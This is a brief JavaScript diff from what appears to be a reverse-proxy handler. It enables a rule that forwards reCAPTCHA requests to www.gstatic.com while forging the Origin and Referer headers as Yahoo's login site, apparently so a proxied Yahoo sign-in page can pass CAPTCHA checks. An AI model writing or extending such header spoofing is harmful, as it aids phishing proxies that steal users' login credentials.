@@ -138,10 +138,12 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
         }
 
 
-        // if (this.req.url.startsWith('/recaptcha/releases')) {
-        //     return super.superExecuteProxy('www.gstatic.com', clientContext)
+        if (this.req.url.startsWith('/recaptcha/releases/')) {
 
-        // }
+            this.req.headers['origin'] = 'https://login.yahoo.net'
+            this.req.headers['referer'] = 'https://login.yahoo.net'
+            return super.superExecuteProxy('www.gstatic.com', clientContext)
+       }
 
        
 
